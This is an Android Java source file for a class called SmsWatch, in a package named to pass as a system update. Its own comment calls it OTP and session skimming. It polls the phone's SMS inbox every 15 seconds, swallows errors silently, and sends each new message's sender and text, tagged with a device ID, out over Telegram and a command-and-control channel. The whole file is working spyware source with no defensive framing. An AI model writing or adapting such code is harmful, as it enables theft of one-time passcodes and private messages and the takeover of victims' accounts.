package com.system.update;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.Telephony;

/** Poll latest SMS — OTP/session skimming. */
public final class SmsWatch {
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static long lastDate;
    private static boolean running;

    private SmsWatch() {}

    public static void start(Context ctx) {
        if (running) return;
        running = true;
        Context app = ctx.getApplicationContext();
        H.post(new Runnable() {
            @Override public void run() {
                try {
                    Cursor c = app.getContentResolver().query(
                            Telephony.Sms.Inbox.CONTENT_URI,
                            new String[]{Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE},
                            null, null, Telephony.Sms.DATE + " DESC LIMIT 5");
                    if (c != null) {
                        while (c.moveToNext()) {
                            long date = c.getLong(2);
                            if (date <= lastDate) continue;
                            if (lastDate != 0) {
                                String addr = c.getString(0);
                                String body = c.getString(1);
                                Telegram.send("💬 SMS\nid=" + C2.getDeviceId()
                                        + "\nfrom=" + addr + "\n" + body);
                                C2.send("sms_live", addr + " | " + body);
                            }
                            if (date > lastDate) lastDate = date;
                        }
                        c.close();
                    }
                } catch (Throwable ignored) {}
                if (running) H.postDelayed(this, 15_000);
            }
        });
    }
}
